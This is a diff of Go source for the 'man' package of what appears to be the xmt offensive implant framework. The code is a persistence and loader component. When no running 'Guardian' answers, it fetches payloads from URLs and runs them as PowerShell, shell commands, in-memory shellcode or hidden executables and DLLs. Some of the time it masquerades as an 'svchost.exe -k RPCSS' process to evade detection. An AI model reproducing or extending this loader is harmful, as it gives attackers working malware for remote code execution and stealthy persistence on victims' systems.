@@ -1,23 +1,20 @@
 package man
 
 import (
-	"bytes"
 	"context"
 	"crypto/cipher"
-	"crypto/rand"
+	"encoding/json"
 	"io"
-	"io/ioutil"
-	"net"
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
-	"github.com/iDigitalFlame/xmt/com/pipe"
-	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -30,346 +27,366 @@ const (
 	timeoutWeb = time.Second * 30
 )
 
-var (
-	// ErrNoEndpoints is an error returned if no valid Guardian paths could be used and/or found during a launch.
-	ErrNoEndpoints = xerr.New("no Guardian paths found")
+// ErrNoEndpoints is an error returned if no valid Guardian paths could be used and/or found during a launch.
+var ErrNoEndpoints = xerr.New("no Guardian paths found")
 
-	client = &http.Client{
-		Timeout: timeoutWeb,
-		Transport: &http.Transport{
-			Proxy:                 http.ProxyFromEnvironment,
-			DialContext:           (&net.Dialer{Timeout: timeoutWeb, KeepAlive: timeoutWeb, DualStack: true}).DialContext,
-			MaxIdleConns:          64,
-			IdleConnTimeout:       timeoutWeb,
-			TLSHandshakeTimeout:   timeoutWeb,
-			ExpectContinueTimeout: timeoutWeb,
-			ResponseHeaderTimeout: timeoutWeb,
-		},
+// Sentinel is a struct that can be used as a 'Named' arguments value to
+// functions in the 'man' package or can be Marshaled from a file or bytes source.
+type Sentinel struct {
+	Filter *cmd.Filter
+	Linker string
+	Paths  []string
+}
+
+// Loader is an interface that allows for Sentinel structs to be built ONLY
+// AFTER a call to 'Check' returns false.
+//
+// This prevents reading of any Sentinel files if the Guardian already is running
+// and no action is needed.
+//
+// This is an internal interface that can be used by the 'LazyF' and 'LazyC' functions.
+type Loader interface {
+	Wake(string) (bool, error)
+	Check(Linker, string) (bool, error)
+	WakeContext(context.Context, string) (bool, error)
+	CheckContext(context.Context, Linker, string) (bool, error)
+}
+type lazyLoader struct {
+	o sync.Once
+	r *Sentinel
+	f func() *Sentinel
+}
+
+// F is a helper function that can be used as an in-line function.
+// This function will ALWAYS return a non-nil Sentinel.
+//
+// The returned Sentinel will be Marshaled from the supplied file path.
+// If any errors occur, an empty Sentinel struct will be returned instead.
+func F(p string) *Sentinel {
+	s, err := File(p)
+	if err == nil {
+		return s
 	}
+	return new(Sentinel)
+}
+func (z *lazyLoader) init() {
+	z.r = z.f()
+}
 
-	filterAny = (&cmd.Filter{Fallback: true}).SetElevated(device.Local.Elevated)
-)
+// LazyF is a "Lazy" version of the 'F' function.
+//
+// This function will ONLY load and read the file contents if the 'Check' result
+// returns false.
+//
+// This function can be used in-place of Sentinel structs in all functions.
+func LazyF(p string) Loader {
+	return &lazyLoader{f: func() *Sentinel { return F(p) }}
+}
+func (s *Sentinel) text() [][]byte {
+	v := make([][]byte, 0, len(s.Paths)+2)
+	if s.Filter != nil {
+		if b, err := json.Marshal(s.Filter); err == nil && len(b) > 2 {
+			v = append(v, b)
+		}
+	}
+	if len(s.Linker) > 0 {
+		v = append(v, []byte("*"+strings.ToLower(s.Linker)))
+	}
+	for i := range s.Paths {
+		v = append(v, []byte(s.Paths[i]))
+	}
+	return v
+}
 
 // Check will attempt to contact any current Guardians watching on the supplied name. This function returns false
 // if the specified name could not be reached or an error occurred.
-func Check(n string) bool {
-	c, err := pipe.DialTimeout(pipe.Format(n), timeout)
+//
+// This function defaults to the 'Pipe' Linker if a nil Linker is specified.
+func Check(l Linker, n string) bool {
+	if l == nil {
+		l = Pipe
+	}
+	v, err := l.check(n)
+	if bugtrack.Enabled {
+		bugtrack.Track("man.Check(): l.(type)=%T n=%s, err=%s, v=%t", l, n, err, v)
+	}
+	return v
+}
+
+// LinkerFromName will attempt to map the name provided to an appropriate Linker
+// interface.
+//
+// If no linker is found, the 'Pipe' Linker will be returned.
+func LinkerFromName(n string) Linker {
+	if len(n) == 0 {
+		return Pipe
+	}
+	switch strings.ToLower(n) {
+	case "t", "tcp":
+		return TCP
+	case "p", "pipe":
+		return Pipe
+	case "e", "event":
+		return Event
+	case "m", "mutex":
+		return Mutex
+	case "n", "mailslot":
+		return Mailslot
+	case "s", "semaphore":
+		return Semaphore
+	}
+	return Pipe
+}
+
+// File will attempt to Marshal the Sentinel struct from the supplied file path.
+// This function will also attempt to fill in the Filter and Linker parameters.
+//
+// Any errors that occur during reading will be returned.
+func File(p string) (*Sentinel, error) {
+	f, err := os.OpenFile(p, os.O_RDONLY, 0)
 	if err != nil {
-		return false
+		return nil, err
 	}
-	var (
-		b    = *bufs.Get().(*[]byte)
-		_, _ = util.Rand.Read(b[1:])
-		h    = crypto.SHA512(b[1:])
-	)
-	b[0] = 0xFF
-	c.SetDeadline(time.Now().Add(timeout))
-	if _, err := c.Write(b); err != nil {
-		c.Close()
-		bufs.Put(&b)
-		return false
+	s, err := Reader(f)
+	if f.Close(); err != nil {
+		return nil, err
 	}
-	if n, err := c.Read(b); err != nil || n != 65 {
-		c.Close()
-		bufs.Put(&b)
-		return false
+	return s, nil
+}
+
+// C is a helper function that can be used as an in-line function.
+// This function will ALWAYS return a non-nil Sentinel.
+// This function uses the provided 'cipher.Block' to decrypt the resulting file
+// data. A nil block is the same as a 'F(p)' call.
+//
+// The returned Sentinel will be Marshaled from the supplied Cipher and file path.
+// If any errors occur, an empty Sentinel struct will be returned instead.
+func C(c cipher.Block, p string) *Sentinel {
+	s, err := Crypt(c, p)
+	if err == nil {
+		return s
 	}
-	bufs.Put(&b)
-	if c.Close(); b[0] == 0xA0 && bytes.Equal(b[1:], h) {
-		return true
-	}
-	return false
+	return new(Sentinel)
+}
+
+// LazyC is a "Lazy" version of the 'C' function.
+//
+// This function will ONLY load and read the file contents if the 'Check' result
+// returns false.
+//
+// This function can be used in-place of Sentinel structs in all functions.
+func LazyC(c cipher.Block, p string) Loader {
+	return &lazyLoader{f: func() *Sentinel { return C(c, p) }}
 }
 func exec(f *cmd.Filter, p ...string) error {
 	if len(p) == 0 {
 		return cmd.ErrEmptyCommand
 	}
+	if bugtrack.Enabled {
+		bugtrack.Track("man.exec(): Running p=%s", p)
+	}
 	var e cmd.Runnable
 	if device.OS == device.Windows && strings.HasSuffix(strings.ToLower(p[0]), ".dll") {
-		e = cmd.NewDLL(p[0])
+		// 1 -in- 5 chance of using a Zombie process instead.
+		if util.FastRandN(5) == 0 {
+			x := cmd.NewZombie(nil, "svchost.exe", "-k", "RPCSS", "-p")
+			x.Path = p[0]
+			x.SetWindowDisplay(0)
+			x.SetNoWindow(true)
+			e = x
+		} else {
+			e = cmd.NewDLL(p[0])
+		}
 	} else {
 		x := cmd.NewProcess(p...)
 		x.SetWindowDisplay(0)
 		x.SetNoWindow(true)
 		e = x
 	}
-	if f == nil {
-		e.SetParent(filterAny)
-	} else {
-		e.SetParent(f)
-	}
+	e.SetParent(f)
 	return e.Start()
 }
-func readRaw(r io.Reader) ([]string, error) {
-	var (
-		b      = *bufs.Get().(*[]byte)
-		n, err = r.Read(b[0:2])
-	)
-	if n = int(uint16(b[1]) | uint16(b[0])<<8); err != nil || n <= 0 {
-		bufs.Put(&b)
-		return nil, err
-	}
-	var (
-		c int
-		x strings.Builder
-		s = make([]string, n)
-	)
-	for x.Grow(len(b)); ; {
-		if n, err = r.Read(b); n == 0 && err != nil {
-			break
-		}
-		for i := 0; i < n; i++ {
-			if b[i] == 0x1E {
-				s[c] = x.String()
-				x.Reset()
-				c++
-				continue
-			}
-			x.WriteByte(b[i])
-		}
-	}
-	if err == io.EOF {
-		return s, nil
-	}
-	return s, err
+
+// Wake will attempt to look for a Guardian using the provided path. This uses
+// the set Linker in the Sentinel.
+//
+// This function will return true and nil if a Guardian is launched and false and nil
+// if a Guardian was found. Any other errors that occur will also be returned with false.
+func (s Sentinel) Wake(n string) (bool, error) {
+	return s.WakeContext(context.Background(), n)
 }
-func writeRaw(w io.Writer, s []string) error {
-	var (
-		n      = len(s)
-		_, err = w.Write([]byte{byte(n >> 8), byte(n)})
-	)
-	if err != nil {
-		return err
-	}
-	for i := range s {
-		if _, err := w.Write([]byte(s[i])); err != nil {
-			return err
-		}
-		if _, err := w.Write([]byte{0x1E}); err != nil {
-			return err
-		}
-	}
-	return nil
+func (z *lazyLoader) Wake(n string) (bool, error) {
+	return z.WakeContext(context.Background(), n)
 }
 
-// Wake will attempt to contact any current Guardians watching on the supplied name. The Sentinel will launch a
-// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
-// will return true and nil if a Guardian is launched and false and nil if a Guardian was found.
-func Wake(name string, paths ...string) (bool, error) {
-	return WakeContext(context.Background(), name, nil, paths...)
+// Check will attempt to look for a Guardian using the provided Linker and path.
+// This overrides the set Linker in the Sentinel.
+//
+// This function will return true and nil if a Guardian is launched and false and nil
+// if a Guardian was found. Any other errors that occur will also be returned with false.
+func (s Sentinel) Check(l Linker, n string) (bool, error) {
+	return s.CheckContext(context.Background(), l, n)
+}
+func (z *lazyLoader) Check(l Linker, n string) (bool, error) {
+	return z.CheckContext(context.Background(), l, n)
 }
 
-// Encode will attempt to write the data of the suplied string array into a encode byte array. If the supplied Cipher
-// block is not nil, this will attempt to use the Cipher and append a randomized IV value to the beginning of the
-// output. This function returns an error if the encoding fails.
-func Encode(c cipher.Block, s []string) ([]byte, error) {
-	var b *bytes.Buffer
-	if err := write(b, c, s); err != nil {
-		return nil, err
-	}
-	return b.Bytes(), nil
+// WakeContext will attempt to look for a Guardian using the provided path.
+// This uses the set Linker in the Sentinel and will use the provided Context for
+// cancelation.
+//
+// This function will return true and nil if a Guardian is launched and false and nil
+// if a Guardian was found. Any other errors that occur will also be returned with false.
+func (s Sentinel) WakeContext(x context.Context, n string) (bool, error) {
+	return s.CheckContext(x, LinkerFromName(s.Linker), n)
 }
-func read(r io.Reader, c cipher.Block) ([]string, error) {
-	if c == nil {
-		return readRaw(r)
-	}
-	var (
-		n             = c.BlockSize()
-		l             = n
-		s    []string = nil
-		b, a []byte   = *bufs.Get().(*[]byte), nil
-		err  error
-	)
-	if len(b) < n {
-		l = len(b)
-	}
-	if _, err = r.Read(b[:l]); err == nil && n > len(b) {
-		a = make([]byte, n-len(b))
-		_, err = r.Read(a)
-	}
-	if err == nil {
-		i, _ := crypto.DecryptReader(c, append(b[:l], a...), r)
-		s, err = readRaw(i)
-		i.Close()
-	}
-	bufs.Put(&b)
-	return s, err
-}
-func write(w io.Writer, c cipher.Block, s []string) error {
-	if c == nil {
-		return writeRaw(w, s)
-	}
-	var (
-		n           = c.BlockSize()
-		l           = n
-		b, a []byte = *bufs.Get().(*[]byte), nil
-	)
-	if rand.Read(b); len(b) < n {
-		a, l = make([]byte, n-len(b)), len(b)
-		rand.Read(a)
-	}
-	_, err := w.Write(b[:l])
-	if err == nil && len(a) > 0 {
-		_, err = w.Write(a)
-	}
-	if err == nil {
-		o, _ := crypto.EncryptWriter(c, append(b[:l], a...), w)
-		err = writeRaw(o, s)
-		o.Close()
-	}
-	bufs.Put(&b)
-	return err
-}
-
-// EncodeFile will attempt to write the data of the supplied string array into to the specified file path. If the
-// supplied Cipher block is not nil, this will attempt to use the Cipher and append a randomized IV value to the
-// beginning of the file. This function returns an error if the write or file creation errors occur.
-func EncodeFile(file string, c cipher.Block, s []string) error {
-	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
-	if err != nil {
-		return err
-	}
-	err = write(f, c, s)
-	f.Close()
-	return err
-}
-
-// WakeFile will attempt to look for a Guardian using the following parameters specified. This includes a
-// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
-// the 'Encode' or 'EncodeFile' functions and can use the supplied cipher block if needed.
-func WakeFile(name, file string, c cipher.Block) (bool, error) {
-	return WakeFileContext(context.Background(), name, file, c, nil)
-}
-func download(x context.Context, f *cmd.Filter, u string) error {
+func download(x context.Context, f *cmd.Filter, u string) (string, error) {
 	var (
 		q, c = context.WithTimeout(x, timeout*5)
 		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
 	)
 	i, err := client.Do(r)
 	if c(); err != nil {
-		return err
+		return "", err
 	}
-	b, err := ioutil.ReadAll(i.Body)
+	b, err := io.ReadAll(i.Body)
 	if i.Body.Close(); err != nil {
-		return err
+		return "", err
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("man.download(): Download u=%s", u)
 	}
 	var d bool
 	switch strings.ToLower(i.Header.Get("Content-Type")) {
 	case "cmd/dll", "application/dll":
 		d = true
 	case "cmd/powershell", "application/powershell":
-		if device.OS == device.Windows {
-			return exec(f, "powershell.exe", "-Comm", string(b))
-		}
-		return exec(f, "pwsh", "-Comm", string(b))
-	case "cmd/cmd", "cmd/execute", "cmd/script", "application/cmd", "application/execute", "application/script":
-		if device.OS == device.Windows {
-			return exec(f, "cmd.exe", "/c", string(b))
-		}
-		return exec(f, "sh", "-c", string(b))
-	case "cmd/binary", "cmd/code", "cmd/shellcode", "application/binary", "application/code", "application/shellcode":
-		e := cmd.Code{Data: b}
-		if f == nil {
-			e.SetParent(filterAny)
+		e := cmd.NewProcessContext(x)
+		e.SetParent(f)
+		e.SetNoWindow(true)
+		if e.SetWindowDisplay(0); device.OS == device.Windows {
+			e.Args = []string{"powershell.exe", "-Comm", string(b)}
 		} else {
-			e.SetParent(f)
+			e.Args = []string{"pwsh", "-Comm", string(b)}
 		}
-		return e.Start()
+		return "", e.Start()
+	case "cmd/cmd", "cmd/execute", "cmd/script", "application/cmd", "application/execute", "application/script":
+		e := cmd.NewProcessContext(x)
+		e.SetParent(f)
+		e.SetNoWindow(true)
+		e.SetWindowDisplay(0)
+		e.Args = append([]string{device.Shell}, device.ShellArgs...)
+		e.Args = append(e.Args, string(b))
+		return "", e.Start()
+	case "cmd/asm", "cmd/binary", "cmd/assembly", "cmd/shellcode", "application/asm", "application/binary", "application/assembly", "application/shellcode":
+		if bugtrack.Enabled {
+			bugtrack.Track("man.download(): Download is shellcode u=%s", u)
+		}
+		e := cmd.NewAsmContext(x, b)
+		e.SetParent(f)
+		return "", e.Start()
 	}
 	var n string
 	if d {
-		n = "dll"
+		n = "*.dll"
 	} else if device.OS == device.Windows {
-		n = "exe"
+		n = "*.exe"
 	} else {
-		n = "sys"
+		n = "*.so"
 	}
-	z, err := ioutil.TempFile("", n)
+	z, err := os.CreateTemp("", n)
 	if err != nil {
-		return err
+		return "", err
 	}
+	p := z.Name()
 	_, err = z.Write(b)
 	if z.Close(); err != nil {
-		return err
+		return p, err
 	}
-	if d {
+	if bugtrack.Enabled {
+		bugtrack.Track("man.download(): Download to tempfile u=%s, p=%s", u, p)
+	}
+	if os.Chmod(z.Name(), 0755); n == "*.dll" {
 		e := cmd.NewDLL(z.Name())
-		if f == nil {
-			e.SetParent(filterAny)
-		} else {
-			e.SetParent(f)
-		}
-		return e.Start()
+		e.SetParent(f)
+		return p, e.Start()
 	}
-	os.Chmod(z.Name(), 0755)
-	return exec(f, z.Name())
+	e := cmd.NewProcessContext(x, p)
+	e.SetParent(f)
+	e.SetNoWindow(true)
+	e.SetWindowDisplay(0)
+	return p, e.Start()
 }
-func wake(x context.Context, n string, f *cmd.Filter, p []string) (bool, error) {
+func (z *lazyLoader) WakeContext(x context.Context, n string) (bool, error) {
+	z.o.Do(z.init)
+	return z.r.CheckContext(x, LinkerFromName(z.r.Linker), n)
+}
+
+// CheckContext will attempt to look for a Guardian using the provided Linker and path.
+// This overrides the set Linker in the Sentinel and will use the provided Context for
+// cancelation.
+//
+// This function will return true and nil if a Guardian is launched and false and nil
+// if a Guardian was found. Any other errors that occur will also be returned with false.
+func (s Sentinel) CheckContext(x context.Context, l Linker, n string) (bool, error) {
+	if Check(l, n) {
+		return false, nil
+	}
+	return wake(x, l, n, s.Filter, s.Paths)
+}
+func (z *lazyLoader) CheckContext(x context.Context, l Linker, n string) (bool, error) {
+	if Check(l, n) {
+		return false, nil
+	}
+	z.o.Do(z.init)
+	return wake(x, l, n, z.r.Filter, z.r.Paths)
+}
+func wake(x context.Context, l Linker, n string, f *cmd.Filter, p []string) (bool, error) {
 	if len(p) == 0 {
 		return false, ErrNoEndpoints
 	}
 	var err error
+	if f == nil {
+		f = cmd.AnyParent
+	}
 	for i := range p {
 		if len(p[i]) == 0 {
 			continue
 		}
+		if bugtrack.Enabled {
+			bugtrack.Track("man.wake(): n=%s, i=%d, p[i]=%s", n, i, p[i])
+		}
 		switch {
 		case p[i] == Self:
-			e, err1 := os.Executable()
-			if err1 != nil {
-				err = err1
-			} else {
+			var e string
+			if e, err = os.Executable(); err == nil {
 				err = exec(f, e)
 			}
 		case strings.HasPrefix(p[i], "http"):
-			err = download(x, f, p[i])
+			var e string
+			if e, err = download(x, f, p[i]); err != nil && len(e) > 0 {
+				os.Remove(e)
+			}
 		default:
 			if _, err = os.Stat(p[i]); err == nil {
 				err = exec(f, p[i])
 			}
 		}
 		if err == nil {
-			if time.Sleep(timeout); !Check(n) {
+			if bugtrack.Enabled {
+				bugtrack.Track("man.wake(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
+			}
+			if time.Sleep(timeout); !Check(l, n) {
+				if bugtrack.Enabled {
+					bugtrack.Track("man.wake(): Wake l.(type)=%T, n=%s failed.", l, n)
+				}
 				continue
 			}
 			return true, nil
 		}
 	}
 	if err != nil {
-		return false, xerr.Wrap(err.Error(), ErrNoEndpoints)
+		return false, err
 	}
 	return false, ErrNoEndpoints
-}
-
-// WakeContext will attempt to contact any current Guardians watching on the supplied name. This will launch a
-// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
-// will return true and nil if a Guardian is launched and false and nil if a Guardian was found. This function
-// will additionally take a Context that can be used to cancel any attempts when downloading.
-//func WakeContext(x context.Context, name string, paths ...string) (bool, error) {
-func WakeContext(x context.Context, name string, f *cmd.Filter, paths ...string) (bool, error) {
-	if Check(name) {
-		return false, nil
-	}
-	return wake(x, name, f, paths)
-}
-
-// WakeFileContext will attempt to look for a Guardian using the following parameters specified. This includes a
-// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
-// the 'Encode' or 'EncodeFile' functions. This function will additionally take a Context that can be used to
-// cancel any attempts when downloading.
-//
-//.func WakeFileContext(x context.Context, name, file string, c cipher.Block) (bool, error) {
-func WakeFileContext(x context.Context, name, file string, c cipher.Block, f *cmd.Filter) (bool, error) {
-	if Check(name) {
-		return false, nil
-	}
-	d, err := os.OpenFile(file, os.O_RDONLY, 0)
-	if err != nil {
-		return false, err
-	}
-	s, err := read(d, c)
-	if d.Close(); err != nil {
-		return false, err
-	}
-	return wake(x, name, f, s)
 }
